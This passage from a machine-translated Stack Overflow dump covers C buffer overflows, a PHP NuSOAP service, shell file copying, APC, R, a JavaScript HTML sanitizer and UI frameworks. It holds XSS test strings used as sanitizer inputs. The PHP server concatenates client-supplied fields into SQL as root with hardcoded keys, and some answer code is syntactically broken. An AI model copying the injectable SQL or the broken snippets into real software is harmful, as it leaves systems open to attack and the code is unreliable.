    }
    c[4]=' ';
    c[5]='\0';
    return ;
}
int crea_init_sem(key_t chiave, int val)
{ 
  int sem;
  sem=semget(chiave,1,IPC_CREAT|0666);
  if (sem==-1)
     { 
       printf("Impossibile creare il semaforo\n");
       exit(1);
     }
  semctl(sem,0,SETVAL,val);
  return(sem);
}

void elimina_sem(int id_sem)
{
  if(semctl(id_sem,IPC_RMID,0)==-1)
    { 
      printf("Impossibile eliminare il semaforo\n");
      exit(1);
    }
}

int sem_wait(int sem)
{
  struct sembuf operazione[1]={{0,-1,0}};
  return semop(sem,operazione,1);
}

int sem_signal(int sem)
{
  struct sembuf operazione[1]={{0,+1,0}};
  return semop(sem,operazione,1);
} 
```

**这就是崩溃：**

```
*** stack smashing detected ***: ./Client
======= Memory map: ========

    uca@luca-8:~/Scrivania/tesina/ufficial$ ./Client

    1 visualizza;

    2 prenota;

    3 cancella;

    4 esci;

    2

    Digitare il numero di posti che si vuole prenotare compreso tra 1 e 15

    2

    Digitare il 1° posto nel formato 'fila poltrona' con fila compresa tra 1..3 e poltrona tra 1..5 

    3 1

    Digitare il 2° posto nel formato 'fila poltrona' con fila compresa tra 1..3 e poltrona tra 1..5 

    3 2

    00000

    00000

    11000

    prenotazione effettuata con codice: 1804 

    *** stack smashing detected ***: ./Client terminated

    ======= Backtrace: =========

    /lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x9408d5]

    /lib/i386-linux-gnu/libc.so.6(+0xe7887)[0x940887]

    ./Client[0x8048c8d]

    ./Client[0x80487aa]

    /lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x872113]

    ./Client[0x80485c1]

    ======= Memory map: ========

    0019d000-0019e000 r-xp 00000000 00:00 0          [vdso]

    00525000-00541000 r-xp 00000000 08:01 2360250    /lib/i386-linux-gnu/libgcc_s.so.1

    00541000-00542000 r--p 0001b000 08:01 2360250    /lib/i386-linux-gnu/libgcc_s.so.1

    00542000-00543000 rw-p 0001c000 08:01 2360250    /lib/i386-linux-gnu/libgcc_s.so.1

    00859000-009cf000 r-xp 00000000 08:01 2360229    /lib/i386-linux-gnu/libc-2.13.so

    009cf000-009d1000 r--p 00176000 08:01 2360229    /lib/i386-linux-gnu/libc-2.13.so

    009d1000-009d2000 rw-p 00178000 08:01 2360229    /lib/i386-linux-gnu/libc-2.13.so

    009d2000-009d5000 rw-p 00000000 00:00 0 

    00b18000-00b36000 r-xp 00000000 08:01 2360216    /lib/i386-linux-gnu/ld-2.13.so

    00b36000-00b37000 r--p 0001d000 08:01 2360216    /lib/i386-linux-gnu/ld-2.13.so

    00b37000-00b38000 rw-p 0001e000 08:01 2360216    /lib/i386-linux-gnu/ld-2.13.so

    08048000-0804a000 r-xp 00000000 08:01 5636693    /home/luca/Scrivania/tesina/ufficial/Client

    0804a000-0804b000 r--p 00001000 08:01 5636693    /home/luca/Scrivania/tesina/ufficial/Client

    0804b000-0804c000 rw-p 00002000 08:01 5636693    /home/luca/Scrivania/tesina/ufficial/Client

    0809c000-080bd000 rw-p 00000000 00:00 0          [heap]

    b78b1000-b78b2000 rw-p 00000000 00:00 0 

    b78bf000-b78c3000 rw-p 00000000 00:00 0 

    bf8d0000-bf8f1000 rw-p 00000000 00:00 0          [stack]

    Annullato

    luca@luca-8:~/Scrivania/tesina/ufficial$ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:33:03.730

这很可能是由这条线引起的：`scanf("%s",preno);`. 用户可以输入超过 4 个非空格字符并溢出`preno[5]`缓冲区。考虑对要读取的字符数添加限制（例如`"%4s"`）。

我还看到很多`strcpy`- 如果缓冲区的容量小于源字符串，则有可能导致缓冲区溢出和粉碎堆栈。考虑将它们全部更改为`strncpy`，即使您正确分配空间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T12:09:45.123

您是否尝试过使用内存分析工具，例如 valgrind

我发现它对于这类问题非常宝贵

它可以提醒您缓冲导致“堆栈粉碎”类型错误的溢出，从而使您能够查明问题

以我的经验，对于任何严肃的 C 开发，我会说值得花时间和精力来学习如何使用这个或等效工具

# php - 没有得到 PHP / MySQL NuSOAP 的响应

> ID：11309981
> 
> 赞同：4
> 
> 时间：2012-07-03T11:30:17.097
> 
> 标签：php, mysql, web-services, nusoap

我创建了一个基于 PHP/MySQL 的 Web 服务。我写了client.php如下：

```
 <?php 
require_once("lib/nusoap.php");

$host = $_SERVER['HTTP_HOST'];
$serverURL = 'http://'.$host.'/WS-Demo';
$serverScript = 'server.php'; 

$client = new nusoap_client("$serverURL/$serverScript?wsdl", 'wsdl'); 
$error = $client->getError(); 
if ($error) { 
    echo '<pre style="color: red">' . $error . '</pre>'; 
    echo '<p style="color:red;'>htmlspecialchars($cliente->getDebug(), ENT_QUOTES).'</p>'; 
    die(); 
} 

function decryptRJ256($string_to_decrypt)
{
    $key    = 'salt_key - I';
    $iv = 'salt_key - II';
    $string_to_decrypt = base64_decode($string_to_decrypt); 
    $rtn = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $string_to_decrypt, MCRYPT_MODE_CBC, $iv);
    $rtn = rtrim($rtn, "\4");
    return($rtn);
}

function encryptRJ256($string_to_encrypt)
{
    $key    = 'salt_key - I';
    $iv = 'salt_key - II';
    $rtn = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $string_to_encrypt, MCRYPT_MODE_CBC, $iv);
    $rtn = base64_encode($rtn);
    return($rtn);
}

$table = array('users');
$fields = array('DisplayName','Useremail', 'UserName', 'AccountBalance');
$cnd = array('UserID', 'demo');

for($i=0;$i< count($fields); $i++) {
    $fields[$i] = encryptRJ256($fields[$i]);
}

for($i=0;$i< count($table); $i++) {
    $table[$i] = encryptRJ256($table[$i]);
}

for($i=0;$i< count($cnd); $i++) {
    $cnd[$i] = encryptRJ256($cnd[$i]);
}

$result = $client->call( 
            "getDemoData",
            array('fldpara'=>$fields, 'tblpara'=>$table, 'cndpara'=>$cnd),
            "uri:$serverURL/$serverScript",
            "uri:$serverURL/$serverScript/getData"
            ); 

if ($client->fault) {
    echo '<b>Error: ';
    print_r($result);
    echo '</b>';
} else { 
    $error = $client->getError();
    if ($error) { 
        echo '<b style="color: red">-Error: ' . $error . "</b><br />". mysql_error();
    } else {
        $result = decryptRJ256($result);
        echo $result;
    } 
}
?> 
```

和 server.php 如下：

```
 <?php   
    require_once("lib/nusoap.php");
    $host = $_SERVER['HTTP_HOST'];
    $miURL = 'http://'.$host.'/WS-Demo';
    $server = new nusoap_server();
    $server->configureWSDL('My_WebService', $miURL);
    $server->wsdl->schemaTargetNamespace=$miURL;

    $server->register('getDemoData',
                      array('fldpara' => 'xsd:Array', 'tblpara' => 'xsd:Array', 'cndpara' => 'xsd:Array'),
                      array('return' => 'xsd:string'),
                      $miURL);

    function decryptRJ256($string_to_decrypt)
    {
        $key    = 'salt_key - I';
        $iv = 'salt_key - II';
        $string_to_decrypt = base64_decode($string_to_decrypt); 
        $rtn = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $string_to_decrypt, MCRYPT_MODE_CBC, $iv);
        $rtn = rtrim($rtn, "\4");
        return($rtn);
    }

    function encryptRJ256($string_to_encrypt)
    {
        $key    = 'salt_key - I';
        $iv = 'salt_key - II';
        $rtn = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $string_to_encrypt, MCRYPT_MODE_CBC, $iv);
        $rtn = base64_encode($rtn);
        return($rtn);
    }

    function getDemoData($flds, $tbls, $cnds){
        $link=mysql_connect("localhost", "root", "");
        mysql_select_db("test", $link) OR DIE("Error: Database connection error");

        for($i=0;$i< count($flds); $i++) {
            $flds[$i] = decryptRJ256($flds[$i]);
        }

        for($i=0;$i< count($tbls); $i++) {
            $tbls[$i] = decryptRJ256($tbls[$i]);
        }

        for($i=0;$i< count($cnds); $i++) {
            $cnds[$i] = decryptRJ256($cnds[$i]);
        }

        if(! empty($flds)) {
            $what = implode(", ", $flds);
        } else {
            $what = "*";
        }

        if(! empty($tbls)) {
            $from = implode(", ", $tbls);
        }else {
            $err = 1;
        }

        if(! empty($cnds)) {
            $cond = " WHERE ";
            $cond .= $cnds[0] . " = '" . $cnds[1] . "'";
        } else {
            $cond = "";
        }

        $sql = "SELECT ".$what." FROM ".$from . $cond;
        $rsGetData = mysql_query($sql, $link);
        $responseData = '<?xml version="1.0" encoding="UTF-8"?>
        <MyDataSets>';
        $responseData .= '<MyDataSet>';
        $responseData .= '<SQL>'. $sql .'</SQL>';
        $responseData .= '</MyDataSet>';
/* The WHILE LOOP is not WORKING */
        while($rowGetData = mysql_fetch_assoc($rsGetData)) {
            $responseData .= '<MyDataSet>';
            foreach($rowGetData as $k => $v) {
                $responseData .= "<$k>$v</$k>";
            }
            $responseData .= '</MyDataSet>';
        }
/* The WHILE LOOP is not WORKING */
        $responseData .= '</MyDataSets>';
        $responseData = encryptRJ256($sql);
        $responseString = new soapval('return', 'xsd:string', $responseData );
        return $responseString;
    }

    $HTTP_RAW_POST_DATA = isset($HTTP_RAW_POST_DATA) ? $HTTP_RAW_POST_DATA : '';
    $server->service($HTTP_RAW_POST_DATA);
    ?> 
```

从上面的代码中，如果我从 server.php 中注释 while 循环，它会给出正确的输出。但是，如果我删除了输出为“-Error: XML error parsing SOAP payload on line 2: Invalid document end”的注释，即使 SQL 查询是正确的并且同样在 phpMyAdmin 中直接起作用。

请帮我解决调试。尽快..！！！提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-21T10:08:03.477

这可能是因为您的 SOAP 库中的某些方法在您使用的 PHP 版本中被贬低了。

> 在 server.php 页面顶部添加这些行
> 
> ini_set('display_errors','Off');

这应该有效。让我知道。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T09:47:14.417

您的 foreach 循环必须不在 while 中查看 this.for each 将参数作为数组而不是字符串。

```
while($rowGetData = mysql_fetch_assoc($rsGetData)) {
            $responseData .= '<MyDataSet>';
$row[] = $rowGetData;
           }

 foreach($row $k => $v) {
                $responseData .= "<$k>$v</$k>";
            } 
```

# shell - 将特定大小的文件复制到其他目录

> ID：11309985
> 
> 赞同：0
> 
> 时间：2012-07-03T11:30:21.253
> 
> 标签：shell, unix

它是一个面试问题。当面试官了解到我没有 shell 脚本编写经验时，他问了这个“基本”的 shell 脚本问题。这是问题。

将文件从一个大小大于 500 K 的目录复制到另一个目录。

我可以在 c lang 中立即执行此操作，但在 shell 脚本中似乎很困难，因为从未尝试过。我熟悉 unix 基本命令，所以我尝试过，但我只能使用以下命令提取这些文件名。

```
du -sk * | awk  '{ if ($1>500) print $2 }' 
```

另外，让我知道好的 shell 脚本示例书。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T11:45:55.757

它可以通过多种方式完成。我会尝试使用 find：

```
find $FIRSTDIRECTORY -size +500k -exec cp "{\} $SECONDDIRECTORY \; 
```

要限制到当前目录，请使用 -maxdepth 选项。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-03T11:46:02.267

`du`递归到子目录，这可能是不希望的（如果该点不明确，您可能会要求澄清）。您更有可能被期望使用`ls -l`或`ls -s`获得尺寸。

但是您所做的工作可以选择一些文件并打印它们的名称，所以让我们以此为基础。您有一个输出名称列表的命令。您需要将该命令的输出放入`cp`. 如果你的 du|awk 输出这个：

```
Makefile
foo.c
bar.h 
```

你想运行这个：

```
cp Makefile foo.c bar.h otherdirectory 
```

所以你是如何做到这一点的就是这样写的***COMMAND SUBSTITUTION***`$(...)`：

```
cd firstdirectory
cp $(du -sk * | awk '{ if ($1>500) print $2 }') otherdirectory 
```

这是一个有效的脚本。du|awk 命令首先运行，其输出用于构建 cp 命令。有许多微妙的缺点使其不适合一般使用，但初学者级别的 shell 脚本通常就是这样。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:48:33.797

```
find . -mindepth 1 -maxdepth 1 -type f -size +BYTESc -exec cp -t DESTDIR {}\+ 
```

尺寸上的`c`后缀是必不可少的；大小以字节为单位。否则，您在确定`-size`检查结果时可能会出现意外的舍入行为。如果复制是递归的，您还需要注意创建任何目标目录。

# java - Java mvn 执行性能

> ID：11309986
> 
> 赞同：0
> 
> 时间：2012-07-03T11:30:21.720
> 
> 标签：java, performance, maven, exec, maven-plugin

使用 exec 插件运行 java 应用程序与使用 java 命令行运行时有很大的性能差异吗？例如

```
mvn exec:java -Dexec.mainClass="FixTradeTest" 
```

对比

```
java FixTradeTest 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:38:05.920

exec 插件在运行 maven 的同一个 JVM 中运行程序。假设您对 maven 和 java 命令行使用相同的 JVM 风格，*如果您只这样做*，应该不会有太大的不同。

如果您正在运行构建并最终运行此 java 类，那么您将启动一次 JVM，一次启动 Maven，一次启动您的程序。另一方面，您可能会在 JVM 上设置影响程序行为的属性。

如果您还没有，请检查[一下（查找](http://mojo.codehaus.org/exec-maven-plugin/usage.html)*与普通命令行相比的差异*）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:39:19.043

好吧，既然`mvn exec:java ...`将在与 Maven 相同的 JVM 中运行，则不会有太大区别，除了运行`java my.MyClass`总是会快一点，因为 Maven 将在实际运行类之前执行一些操作。

# php - 禁用或删除 apc

> ID：11309987
> 
> 赞同：5
> 
> 时间：2012-07-03T11:30:25.123
> 
> 标签：php, apache, apc, ubuntu-11.04

我在我的 ubuntu 11.04 linux 上安装了 APC，我想进行一些性能基准测试，看看在没有 APC 的情况下 PHP 的速度提高了多少，但我不知道如何禁用/删除 APC。

我试图清空我的 apc.ini 文件，但没有奏效。在我第一次加载页面后，页面将存储在缓存中，第二次加载页面时，加载速度要快得多。

这是我用来测量时间的 PHP 文件。

```
<?php 
    function getTime() 
        { 
        $a = explode (' ',microtime()); 
        return(double) $a[0] + $a[1]; 
        } 
    $Start = getTime(); 
    ?>
    <?php require_once("includes/connection.php");?>
    <?php require_once("includes/functions.php");?>
    <?php
        find_selected_page(true);   
    ?>
    <?php require_once("includes/header.php");?>

        <table id="structure">
            <tr>
                <td id="navigation">
                    <?php echo navigation_public($sel_subject,true);
                      //            $sel_page is sent as a GLOBAL   so that we can reuse is in the page area
                    ?>
                </td>
                <td id="page">
                    <?php

                        if($sel_page!=NULL)
                        {
                            echo "<h2>".htmlentities($sel_page['menu_name'])."</h2>";
                            echo "<p>".strip_tags(nl2br($sel_page['content']),"<b><br><p><a>")."</p>";
                        }
                        else if($sel_subject!=NULL) 
                        {
                            echo "<h2>".$sel_subject['menu_name']."</h2>";
                        }
                        else 
                        {
                            echo "<h2>Welcome to Widget Corp</h2>";
                        }
                    ?>
                </td>   
            </tr>   
        </table>    
        <?php 
    $End = getTime(); 
    echo "Time taken = ".number_format(($End - $Start),3)." secs"; 
    ?>
    <?php require("includes/footer.php");?> 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-03T11:46:25.130

Change :

```
extension=apc.so 
```

By :

```
;extension=apc.so 
```

In :

```
/etc/php5/apache2/conf.d/apc.ini 
```

And restart Apache server :

```
apache2ctl graceful 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-09-19T14:08:28.737

您可以使用 root 权限输入以下命令：

```
pecl uninstall apc 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-07-03T12:56:11.387

apc.enabled 可以设置为 0 来禁用 php.ini 中的 APC，然后重新启动您的 Web 服务器或 php-fpm。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-03-22T14:23:04.327

您可以使用以下脚本，然后将其放在 php 文件的第一行，

```
apc_clear_cache(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-02-17T21:55:34.853

如果您正在运行 apache：

1.  在项目的根目录中编辑或创建 .htaccess 文件

2.  将此行添加到文件中

    php_flag apc.cache_by_default 关闭

3.  重启服务器

# regression - R：在函数中调用 rq() 并定义线性预测器

> ID：11309992
> 
> 赞同：0
> 
> 时间：2012-07-03T11:30:49.117
> 
> 标签：regression, quantile

我试图在函数中调用 quantreg 包的 rq() 。以下是对我的问题的简化解释。

如果我遵循 [http://developer.r-project.org/model-fitting-functions.txt](http://developer.r-project.org/model-fitting-functions.txt)中的建议，我在行后有一个设计矩阵

```
x <- model.matrix(mt, mf, contrasts) 
```

第一列全为 1 以创建截距。

现在，当我调用 rq() 时，我不得不使用类似

```
fit <- rq (y ~ x [,2], tau = 0.5, ...) 
```

如果有超过 1 个解释变量，我的问题就会发生。我不知道如何找到一种自动编写方式：

```
x [,2] + x [,3] + x [,4] + ... 
```

这是完整的简化代码：

```
ao_qr <- function (formula, data, method = "br",...) {

cl <- match.call ()

## keep only the arguments which should go into the model 
## frame

mf <- match.call (expand.dots = FALSE)

m <- match (c ("formula", "data"), names (mf), 0)

mf <- mf[c (1, m)]

mf$drop.unused.levels <- TRUE

mf[[1]] <- as.name ("model.frame")

mf <- eval.parent (mf)

if (method == "model.frame") return (mf)

## allow model.frame to update the terms object before 
## saving it

mt <- attr (mf, "terms") 

y <- model.response (mf, "numeric")

x <- model.matrix (mt, mf, contrasts)

## proceed with the quantile regression

fit <- rq (y ~ x[,2], tau = 0.5, ...)

print (summary (fit, se = "boot", R = 100))
} 
```

我用以下方法调用该函数：

```
ao_qr(pain ~ treatment + extra, data = data.subset) 
```

以下是获取数据的方法：

```
require (lqmm)
data(labor)
data <- labor

data.subset <- subset (data, time == 90)
data.subset$extra <- rnorm (65) 
```

在这种情况下，使用此代码，我的线性预测器仅包含“治疗”。如果我想要“额外”，我必须在代码中的 rq() 的线性预测器中手动添加 x[,3] 。这不是自动的，并且不适用于具有未知数量变量的其他数据集。有谁知道如何解决这个问题？

任何帮助将不胜感激 ！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:57:29.083

我找到了一个简单的解决方案：x[,2:ncol(x)]

# javascript - 在 JavaScript 中呈现一个安全的 HTML 子集

> ID：11309993
> 
> 赞同：3
> 
> 时间：2012-07-03T11:30:53.517
> 
> 标签：javascript, html

作为[markdown](http://daringfireball.net/projects/markdown/)的替代方法，我正在寻找一种在 JavaScript 中安全地解析 HTML 的可配置子集的方法。

例如，对于（不受信任的）输入

```
<b onclick="alert('XSS');" data-myapp="asdf" style="color:red">Hello</b>
<h1><i style="color:expression(alert('XSS'));"> World</i></h1> 
```

与参数

```
allowTags: b, i
allowAttrs: data-myapp
allowSafeStyle: color 
```

我希望输出

```
<b data-myapp="asdf" style="color:red">Hello</b>
<i> World</i> 
```

Markdown 似乎无法表达更复杂的属性。[Caja](http://code.google.com/p/google-caja/)似乎非常接近我想要的，但需要服务器端渲染。那么，如何在 JavaScript 中呈现 HTML 的*安全子*集（根据上述参数`allowTags`,`allowAttrs`等）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T12:04:02.213

我使用 jQuery 来缩短我的答案并包含更少的样板代码，但这并不相关。

我正在使用它是`.innerHTML`因为它不会在 html 中执行可能的脚本或 css。

在这里演示[http://jsfiddle.net/QCaGq/](http://jsfiddle.net/QCaGq/)

```
function filterData(data, options ){
    var root;

    try {
        root = document.implementation.createHTMLDocument().body;
    }
    catch(e) {
        root = document.createElement("body");
    }

    root.innerHTML = data;

    $(root).find("*").filter(function(){
        return options.allowTags.indexOf(this.tagName.toLowerCase()) === -1;
    }).each( function() {
        $(this).children().detach().insertBefore( this );
        $(this).remove();
    });

    function removeStyle( node, attr ) {
        var style = node.style,
            prop,
            name,
            len = style.length,
            i, val = "";

        for( i = 0; i < len; ++i ) {
            name = style[i];
            prop = style[name];

            if( options.allowSafeStyle.indexOf( name ) > -1 ) {
                val += (name + ":" + prop + ";");
            }
        }

        if( val ) {
            attr.nodeValue = val;
        }
        else {
            node.removeAttribute("style");
        }
    }

    function removeAttrs( node ) {
        $.each( node.attributes, function( index, attr ) {

            if( !attr ) {
                return;
            }

            if( attr.name.toLowerCase() === "style" ) {
                return removeStyle( node, attr );
            }

            if( options.allowAttrs.indexOf(attr.name.toLowerCase()) === -1 ) {
                node.removeAttribute(attr.name);
            }
        });
    }

    function walk( root ) {
        removeAttrs(root);
        $( root.childNodes ).each( function() {
            if( this.nodeType === 8 ) { //Remove html comments
                $(this).remove();
            }
            else if( this.nodeType === 1 ) {
                walk(this);
            }
        });
    }

    walk(root);

    return root.innerHTML; 
} 
```

* * *

```
var opts = {
    allowTags: ["b", "i"],
    allowAttrs: ["data-myapp"],
    allowSafeStyle: ["color"]
}

filterData( '<b onclick="alert(\'XSS\');" data-myapp="asdf" style="color:red">Hello</b>\n<h1><i style="color:expression(alert(\'XSS\'));"> World</i></h1>', opts ); 
```

结果是：

```
<b data-myapp="asdf" style="color:red;">Hello</b>
<i> World</i> 
```

这应该让你开始。

# wicket - 仅针对多个帖子的第一个帖子进行渲染：这可能吗？

> ID：11309995
> 
> 赞同：0
> 
> 时间：2012-07-03T11:30:59.913
> 
> 标签：wicket

我们的用户从外部站点返回到我们的网站，当用户离开我们的站点时，该 URL 被传递到外部站点。返回我们的站点涉及到持久化到应用程序数据存储区的状态更新。

我在返回我们的网站时实施了一项检查，以防止对我们的数据存储进行多次写入，从而使操作具有幂等性。

一个典型的事件顺序是：

1.  第一篇post到我们的登陆网页（网页实例1正在构建中）
2.  第一篇文章通过检查（之前未处理的数据）
3.  数据持久化开始（仍在网页构造函数中）
4.  第二篇文章到我们的登陆网页（网页实例 2 正在构建），它与第一篇文章在同一个会话和浏览器窗口中
5.  第二个帖子检查失败（数据已经或正在处理）
6.  网页实例 2 构造函数完成（对数据存储没有持久性）并向用户提供 Web 响应
7.  网页实例 1 构造函数完成（在持久化到数据存储之后）
8.  用户在浏览器中看不到页面实例 1。

最终结果是，即使第二个帖子是在第一个帖子之后发布的，第二个帖子对用户来说“完成”得更快，并且用户的 Web 浏览器显示页面的实例 2，而不是实例 1。

我的问题是：

*   有什么办法可以让第一个数据存储处理页面实例显示给用户（从而“扔掉”第二个页面实例）？
*   如果是这样，不使用 AJAX 可以做到这一点吗？

我将不胜感激任何帮助。

**我的开发环境**

*   网络框架：Wicket 1.5.7
*   爪哇：1.6.0_33；Java HotSpot(TM) 客户端虚拟机 20.8-b03
*   网络服务器系统：Google App Engine for Java 1.6.6 版
*   操作系统：Microsoft Windows XP Home Edition 2002 SP3（在 x86 上运行的 5.1 版；Cp1252；en_GB）
*   IDE：NetBeans IDE 7.1.2（内部版本 201204101705）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-05T11:02:47.720

感谢@svenmeier 的第一个提示。我的解决方案遵循这种方法。我决定让页面实例 2 在必要时反复等待，而不是遵循@Carl-EricMenzel 的重定向建议。

参考我在问题中列出的事件顺序，步骤 6 替换为：

6.1 如果数据已经在处理，页面实例 2 会重复等待，同时在每次等待后检查。

6.2 在所有的等待之后，页面实例 1 将完成第 7 步（和第 8 步）。如果不是，则页面实例 2 完成构建。

6.3 如果实例 1 的数据处理成功，则页面实例 2 向用户显示成功。

6.4 如果实例 1 的数据处理失败，则页面实例 2 处理数据并向用户显示结果（成功/失败）。

# wpf - 自动调整 WPF 网格列的大小

> ID：11309996
> 
> 赞同：0
> 
> 时间：2012-07-03T11:31:02.847
> 
> 标签：wpf, grid

我有一个 WPF 应用程序，其中包含两列的网格元素。第二列还包含网格元素。我有一个计时器，5 秒后第二个网格的可见性被折叠，但第一列没有调整大小。

在将第二个网格的可见性设置为折叠后，可以自动调整第一列的大小（以适应整个窗口？

```
-----------------------|
|               |      |
|               |grid2 |
|               |      |
|               |      |
|--------------------- |

<Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>
        <Grid.ColumnDefinitions>
            <ColumnDefinition Width="*"/>
            <ColumnDefinition Width="5"/>
            <ColumnDefinition Width="200"/>
        </Grid.ColumnDefinitions>

        <!-- Browser -->
        <my:WebControl Visibility="{Binding IsIEVisible,Converter={StaticResource BoolToVisibleconverter}}" Grid.Column="0" HorizontalAlignment="Stretch" VerticalAlignment="Stretch" Name="webControl1">

        </my:WebControl>

        <GridSplitter Visibility="{Binding isVisiblePult, Converter={StaticResource BoolToVisibleconverter}}" HorizontalAlignment="Center" VerticalAlignment="Stretch" Width="5" Grid.RowSpan="2" Grid.Column="1"/>

        <Grid Visibility="{Binding isVisiblePult, Converter={StaticResource BoolToVisibleconverter}}" Grid.Column="2">
            <Grid.RowDefinitions>
                <RowDefinition Height="*"/>
            </Grid.RowDefinitions>
            <ListBox x:Name="ListChannels" Grid.Row="1" SelectedItem="{Binding SelectedChannel}" ItemsSource="{Binding Channels}" FontSize="14" Background="#FFD4ECFF">
                <ListBox.ItemTemplate>
                    <DataTemplate>
                        <TextBlock FontSize="17" Text="{Binding Name}"/>
                    </DataTemplate>
                </ListBox.ItemTemplate>

            </ListBox>
        </Grid> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T12:18:59.390

将第二列和第三列定义设为“自动”，然后在网格拆分器和第二个网格上设置显式宽度。然后，当您折叠它们时，主网格将按照您的要求运行

# extjs4 - （图书馆问题）

> ID：11309998
> 
> 赞同：2
> 
> 时间：2012-07-03T11:31:08.073
> 
> 标签：extjs4, extjs

我正在使用带有 Extjs 4 的 Sencha Architect 并遵循此处的基本示例：http: [//geoext.org/tutorials/quickstart.html#basic-example](http://geoext.org/tutorials/quickstart.html#basic-example)

我必须将包含的库从 Ext 3 切换到 Ext 4，所以我输入：

```
<script src="extjs-4/ext-all.js"  type="text/javascript"></script>
<script src="extjs-4/ext.js"  type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="extjs-4/resources/css/ext-all.css"></link>
<script src="GeoExt/lib/GeoExt.js" type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="GeoExt/resources/css/geoext-all-debug.css"></link>
<script type="text/javascript" src="app.js"></script> 
```

问题是我不断收到错误，我认为这是因为缺少库。但仍然无法弄清楚它到底是什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T11:51:49.963

Geo ext 与 extjs 3.x top 兼容，因此不适用于 extjs 4。您应该检查与 extjs 4 兼容的 geo ext 2 源。请参阅此链接[http://geoext.blogspot.ro/2012/ 05/geoext2-sprint-results.html](http://geoext.blogspot.ro/2012/05/geoext2-sprint-results.html)